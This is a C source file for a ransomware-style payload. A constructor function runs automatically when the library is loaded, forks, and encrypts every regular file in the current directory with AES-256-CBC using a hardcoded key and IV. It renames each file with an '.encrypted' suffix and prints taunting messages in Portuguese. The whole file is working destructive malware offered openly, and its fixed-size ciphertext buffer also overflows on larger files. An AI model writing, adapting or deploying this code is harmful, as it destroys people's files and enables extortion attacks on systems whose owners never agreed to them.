#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <openssl/evp.h>
#include <openssl/aes.h>

unsigned char key[] = "IniKey32ByteUntukAES256!!!12345"; 
unsigned char iv[]  = "IniIV16ByteCok!!";               

void encrypt_file(const char *path) {
    FILE *f = fopen(path, "rb+");

    if (!f) return;
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);

    unsigned char *plaintext = malloc(fsize);
    fread(plaintext, 1, fsize, f);

    unsigned char ciphertext[4096];
    int outlen, total = 0;
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

    if (!EVP_EncryptUpdate(ctx, ciphertext, &outlen, plaintext, fsize)) {
        free(plaintext); EVP_CIPHER_CTX_free(ctx); return;
    }
    total += outlen;

    if (!EVP_EncryptFinal_ex(ctx, ciphertext + total, &outlen)) {
        free(plaintext); EVP_CIPHER_CTX_free(ctx); return;
    }
    total += outlen;

    fseek(f, 0, SEEK_SET);
    fwrite(ciphertext, 1, total, f);
    fclose(f);
    rename(path, strcat((char*)path, ".encrypted")); 
    free(plaintext);
    EVP_CIPHER_CTX_free(ctx);
}

void __attribute__((constructor)) run_payload(void) {
    if (fork() == 0) {
        printf("=======================================\n");
        printf("   Vai tomando\n");
        printf("   Key = %s\n", key);
        printf("   IV  = %s\n", iv);
        printf("   Iniciando criptografia em background...\n");
        printf("=======================================\n");

        DIR *d = opendir(".");
        struct dirent *dir;
        if (d) {
            while ((dir = readdir(d)) != NULL) {
                if (strstr(dir->d_name, ".encrypted") || strstr(dir->d_name, "oiii")) continue;
                
                if (dir->d_type == DT_REG) {
                    printf("Criptografando %s ... \n", dir->d_name);
                    encrypt_file(dir->d_name);
                }
            }
            closedir(d);
        }

        printf("\nTodos os arquivos estão criptografados\n");
        printf("Descriptografe usando o mesmo script\n");
        printf("Ou crie o seu próprio, sla, não sou teu pai\n");

        exit(0); 
    }    
}